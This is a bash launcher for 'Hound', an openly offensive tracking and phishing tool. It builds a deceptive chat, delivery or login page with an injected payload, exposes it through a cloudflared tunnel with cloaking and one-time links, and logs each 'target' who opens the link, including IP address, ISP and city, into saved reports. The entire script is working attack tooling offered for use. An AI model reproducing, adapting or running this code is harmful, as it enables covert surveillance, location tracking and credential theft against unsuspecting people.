#!/bin/bash
# Hound v 0.3 - Smart Edition

trap 'printf "\n";stop' 2

banner() {
clear
printf '\n       ██   ██  ██████  ██    ██ ███    ██ ██████ \n'
printf '       ██   ██ ██    ██ ██    ██ ████   ██ ██   ██ \n'
printf '       ███████ ██    ██ ██    ██ ██ ██  ██ ██   ██ \n'
printf '       ██   ██ ██    ██ ██    ██ ██  ██ ██ ██   ██ \n'
printf '       ██   ██  ██████   ██████  ██   ████ ██████  \n\n'
printf '\e[1;31m       ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀\n'
printf " \e[1;93m      Hound Ver 0.3 Smart - by Anil Parashar [TechChip]\e[0m \n"
printf " \e[1;92m      Alerts · Dashboard · Cloaking · Smart Chat\e[0m \n"
printf "\e[1;90m Configure alerts and LLM in config.json before running.\e[0m \n"
printf "\n"
}

dependencies() {
command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
mkdir -p data/sessions
if [[ ! -f config.json ]]; then
printf "\e[1;93m[!] config.json missing. Using bundled defaults.\e[0m\n"
fi
}

stop() {
checkcf=$(ps aux | grep -o "cloudflared" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkcf == *'cloudflared'* ]]; then
pkill -f -2 cloudflared > /dev/null 2>&1
killall -2 cloudflared > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
killall -2 ssh > /dev/null 2>&1
fi
exit 1
}

build_page() {
local template_file="$1"
sed -e '/tc_payload/r payload' "$template_file" | sed 's|\.\./||g' > index.html
}

generate_token_link() {
local base_link="$1"
local campaign="$2"
if php -r '
$config=json_decode(file_get_contents("config.json"),true);
exit(empty($config["security"]["one_time_links"]) ? 1 : 0);
' 2>/dev/null; then
token=$(php -r 'require "smart_engine.php"; echo hound_generate_token("'$campaign'");')
printf "%s" "${base_link}?t=${token}&id=${campaign}"
else
printf "%s?id=${campaign}" "$base_link"
fi
}

print_qr() {
local link="$1"
printf "\e[1;92m[\e[0m+\e[1;92m] QR code URL:\e[0m api/qr.php?data=%s\n" "$(python3 -c "import urllib.parse; print(urllib.parse.quote('$link'))" 2>/dev/null || echo "$link")"
command -v qrencode > /dev/null 2>&1 && qrencode -t ANSIUTF8 "$link"
}

catch_ip() {
ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
if grep -a 'EXTRA:' ip.txt > /dev/null 2>&1; then
extra=$(grep -a 'EXTRA:' ip.txt | tail -n1 | cut -d ' ' -f2-)
command -v jq > /dev/null 2>&1 && printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] ISP/City:\e[0m\e[1;77m %s\e[0m\n" "$(echo "$extra" | jq -r '.ip_enrichment.isp + " | " + .ip_enrichment.city + ", " + .ip_enrichment.country' 2>/dev/null)"
fi
cat ip.txt >> saved.ip.txt
}

checkfound() {
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
printf "\e[1;92m[\e[0m+\e[1;92m] Dashboard:\e[0m %s/dashboard/index.html\n" "$PUBLIC_BASE"
while [ true ]; do
if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
catch_ip
rm -rf ip.txt
tail -f -n 110 data.txt
fi
sleep 0.5
done
}

cf_server() {
if [[ -e cloudflared ]]; then
echo "Cloudflared already installed."
else
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Cloudflared...\n"
arch=$(uname -m)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'aarch64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared > /dev/null 2>&1
elif [[ "$arch" == *'x86_64'* ]]; then
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared > /dev/null 2>&1
else
wget --no-check-certificate https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-386 -O cloudflared > /dev/null 2>&1
fi
fi
chmod +x cloudflared
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
rm -f cf.log
./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
sleep 10
link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "cf.log")
if [[ -z "$link" ]]; then
printf "\e[1;31m[!] Direct link is not generating \e[0m\n"
exit 1
else
PUBLIC_BASE="$link"
final_link=$(generate_token_link "$link" "$CAMPAIGN_ID")
printf "\e[1;92m[\e[0m*\e[1;92m] Direct link:\e[0m\e[1;77m %s\e[0m\n" "$final_link"
print_qr "$final_link"
fi
sed 's+forwarding_link+'$link'+g' template.php > index.php
checkfound
}

local_server() {
PUBLIC_BASE="http://127.0.0.1:8080"
sed 's+forwarding_link+''+g' template.php > index.php
final_link=$(generate_token_link "$PUBLIC_BASE" "$CAMPAIGN_ID")
printf "\e[1;92m[\e[0m+\e[1;92m] Local link:\e[0m %s\n" "$final_link"
print_qr "$final_link"
printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server on Localhost:8080...\n"
php -S 127.0.0.1:8080 > /dev/null 2>&1 &
sleep 2
checkfound
}

hound() {
if [[ -e data.txt ]]; then
cat data.txt >> targetreport.txt
rm -rf data.txt
touch data.txt
fi
if [[ -e ip.txt ]]; then
rm -rf ip.txt
fi

default_template="chat"
read -p $'\n\e[1;93m Template [chat/delivery/login] [Default chat]: \e[0m' template_choice
template_choice="${template_choice:-${default_template}}"
case "$template_choice" in
delivery) template_file="templates/delivery.html" ;;
login) template_file="templates/login.html" ;;
*) template_file="index_chat.html" ;;
esac
build_page "$template_file"

default_campaign="default"
read -p $'\n\e[1;93m Campaign ID for analytics [Default default]: \e[0m' campaign_input
CAMPAIGN_ID="${campaign_input:-${default_campaign}}"

default_option_server="Y"
read -p $'\n\e[1;93m Do you want to use cloudflared tunnel?\n \e[1;92motherwise it will be run on localhost:8080 [Default is Y] [Y/N]: \e[0m' option_server
option_server="${option_server:-${default_option_server}}"
if [[ $option_server == "Y" || $option_server == "y" || $option_server == "Yes" || $option_server == "yes" ]]; then
cf_server
else
local_server
fi
}

banner
dependencies
hound
